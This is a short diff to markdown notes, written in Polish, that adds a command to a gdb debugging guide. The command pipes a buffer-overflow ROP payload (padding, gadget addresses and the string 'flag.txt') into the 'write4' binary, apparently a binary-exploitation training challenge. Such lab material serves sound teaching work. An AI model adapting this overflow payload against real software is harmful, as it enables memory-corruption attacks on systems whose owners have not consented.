@@ -55,3 +55,10 @@ gdb \
   -ex "dashboard threads -output /dev/null" \
   ./build/calc-demo/calculator
 ```
+
+Uruchomić natychmiast, przekieując standardowe wejście do procesu podporządkowanego:
+
+
+```
+printf $'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x93\x06@\x00\x00\x00\x00\x00flag.txt\x00 \x06@\x00\x00\x00\x00\x00' | gdb write4 -ex run
+```
